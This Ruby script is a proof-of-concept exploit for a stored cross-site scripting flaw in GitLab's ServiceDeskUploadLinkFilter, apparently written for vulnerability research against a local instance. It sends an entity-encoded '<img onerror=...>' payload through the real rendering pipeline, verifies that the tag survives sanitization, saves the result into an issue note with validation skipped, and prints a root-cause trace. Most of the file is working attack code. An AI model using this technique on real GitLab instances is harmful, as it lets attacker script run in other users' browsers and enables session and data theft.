#!/usr/bin/env ruby
# frozen_string_literal: true

# =============================================================================
# PoC: ServiceDeskUploadLinkFilter Post-Sanitization XSS
# =============================================================================
# Run with:
#   cd /home/user/gitlab-source
#   bin/rails runner /home/user/testaa/poc_service_desk_xss.rb
# =============================================================================

project = Project.last
user = User.first
abort "No project found" unless project
abort "No user found" unless user

puts "=" * 72
puts "ServiceDeskUploadLinkFilter XSS PoC"
puts "=" * 72
puts

# ---------------------------------------------------------------------------
# 1. Upload a real file so the filter's attachment check passes
# ---------------------------------------------------------------------------
puts "[1] Uploading file..."
tmpfile = Tempfile.new(['poc', '.txt'])
tmpfile.write("harmless")
tmpfile.rewind

uploader = UploadService.new(
  project,
  { tempfile: tmpfile, filename: 'test.txt', content_type: 'text/plain' },
  FileUploader
).execute
abort "Upload failed" unless uploader

secret = uploader.secret
filename = uploader.filename
upload_path = "/uploads/#{secret}/#{filename}"
attachment_key = "#{secret}/#{filename}"

puts "    Upload: #{upload_path}"
puts "    Key:    #{attachment_key}"
puts

# ---------------------------------------------------------------------------
# 2. Run XSS payload through the REAL vulnerable pipeline
# ---------------------------------------------------------------------------
puts "[2] Running payload through ServiceDeskEmailPipeline..."

# HTML entities in the link text — these survive SanitizationFilter as
# harmless text, then .text decodes them and the filter interpolates
# the raw angle brackets back into HTML. That's the bug.
markdown = "[&lt;img src=x onerror=alert(document.domain)&gt;](#{upload_path})"
puts "    Markdown: #{markdown}"

context = {
  project: project,
  pipeline: :service_desk_email,
  uploads_as_attachments: [attachment_key],
}

rendered = Banzai.render(markdown, context)
puts "    Rendered: #{rendered}"
puts

# Verify XSS landed
doc = Nokogiri::HTML::DocumentFragment.parse(rendered)
img = doc.at_css('img')
if img && img['onerror']
  puts "    *** XSS CONFIRMED: <img onerror=\"#{img['onerror']}\"> ***"
else
  puts "    WARNING: img onerror not found in output"
end
puts

# ---------------------------------------------------------------------------
# 3. Write the XSS HTML into a note so you can see it in the browser
# ---------------------------------------------------------------------------
puts "[3] Creating issue + note with XSS payload..."

issue = Issue.create!(
  project: project,
  author: user,
  title: 'ServiceDeskUploadLinkFilter XSS PoC',
  confidential: true
)

note = Note.new(
  project: project,
  noteable: issue,
  author: user,
  note: "ServiceDeskUploadLinkFilter XSS — parent.text decodes HTML entities then interpolates into HTML"
)
note.note_html = rendered
note.save!(validate: false)

url = "http://localhost:8929/#{project.full_path}/-/issues/#{issue.iid}"
puts "    Issue ##{issue.iid} created"
puts "    Note ##{note.id} with XSS HTML injected"
puts
puts "    View: #{url}"
puts

# ---------------------------------------------------------------------------
# 4. Root cause trace
# ---------------------------------------------------------------------------
puts "=" * 72
puts "ROOT CAUSE TRACE"
puts "=" * 72
puts
a_tag = Nokogiri::HTML::DocumentFragment.parse(
  %(<a href="#{upload_path}">&lt;img src=x onerror=alert(document.domain)&gt;</a>)
).at_css('a')
decoded = a_tag.text
puts "  1. Markdown renders entities as safe text inside <a>:"
puts "       &lt;img src=x onerror=alert(document.domain)&gt;"
puts
puts "  2. SanitizationFilter passes it (entities are harmless text)"
puts
puts "  3. ServiceDeskUploadLinkFilter line 31: parent.text"
puts "       Returns: #{decoded.inspect}"
puts "       .text DECODES entities: &lt; -> <, &gt; -> >"
puts
puts "  4. Line 38: Nokogiri::HTML::DocumentFragment.parse(\"<strong>\#{final_filename}</strong>\")"
interpolated = "<strong>#{decoded} (#{filename})</strong>"
puts "       Interpolated string: #{interpolated.inspect}"
puts "       Parsed HTML: #{Nokogiri::HTML::DocumentFragment.parse(interpolated).to_html}"
puts
puts "  => Live <img onerror=...> injected AFTER sanitization"
puts

tmpfile.close
tmpfile.unlink

puts "=" * 72
puts "Done. Open #{url} to see the XSS."
puts "=" * 72
